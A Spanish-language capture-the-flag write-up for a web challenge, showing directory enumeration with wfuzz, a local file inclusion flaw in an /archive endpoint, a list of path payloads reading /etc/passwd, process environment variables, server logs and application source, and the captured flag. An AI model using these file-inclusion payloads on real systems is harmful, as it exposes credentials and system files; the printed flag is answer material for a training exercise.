# Manuscritos antiguos

## Descripcion

En este sitio se esconde un archivo secreto llamado `flag.txt`. Solo un reconocimiento minucioso te llevará al premio

> Dominio dado: https://dspool9.ctf.n3xtl3v3l.site/

## Solucion

Al ingresar al sitio web podemos ver lo siguiente:

![[Pasted image 20250826201011.png]]

Una web vacia, sin enlaces, secciones, botones o codigo interesante, cuando nos topamos contra una web vacia lo comun es realizar una enumeracion para encontrar posibles archivos o directorios, usaremos **wfuzz** en este caso

```
wfuzz -c -u https://dspool9.ctf.n3xtl3v3l.site/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hh 207    
```

Este comando nos reporta lun directorio llamado `archive`, al cual si accedemos vemos lo siguiente, informacion extra referente a archivos, del cual podemos intuir un posible *LFI*

![[Pasted image 20250826201442.png]]

Si podemos consultar archivos desde la url, podriamos intentar buscar la flag o archivos internos del servidor, pero aunque podamos listar archivos comunes como el `/etc/passwd` no somos capaces de obtener la flag en ninguna parte, pero podemos intentar listar archivos en ejecucion

```
/archive?page=/proc/self/cmdline
/archive?page=/proc/self/cwd
/archive?page=/proc/self/environ
/archive?page=/proc/1/environ
/archive?page=/proc/self/status
/archive?page=/var/log/nginx/error.log
/archive?page=/var/log/nginx/access.log
/archive?page=/var/log/apache2/error.log
/archive?page=/var/log/auth.log
```

![[Pasted image 20250826201903.png]]

Al leer el primer archivo podemos ver que en el servidor hay un archivo `app.py` que se esta ejecutando, lo mas probable un archivo hecho con **flask** 

- `https://dspool9.ctf.n3xtl3v3l.site/archive?page=/app.py`

![[Pasted image 20250826202058.png]]

Logramos leer el contenido de ese archivo el cual nos revela un directorio llamado **secrets**, en donde por intuicion suponemos que esta la flag

- `https://dspool9.ctf.n3xtl3v3l.site/archive?page=/../.secret/flag.txt`

Al ejecutar intentar leer la flag dentro de ese directorio obtenemos lo siguiente:

```
Congratulations! You are an LFI master!
n3xt{Y0U_F0UND_TH3_S3CR3T_F1L3!!!!!!}
```

> La flag es: `n3xt{Y0U_F0UND_TH3_S3CR3T_F1L3!!!!!!}`
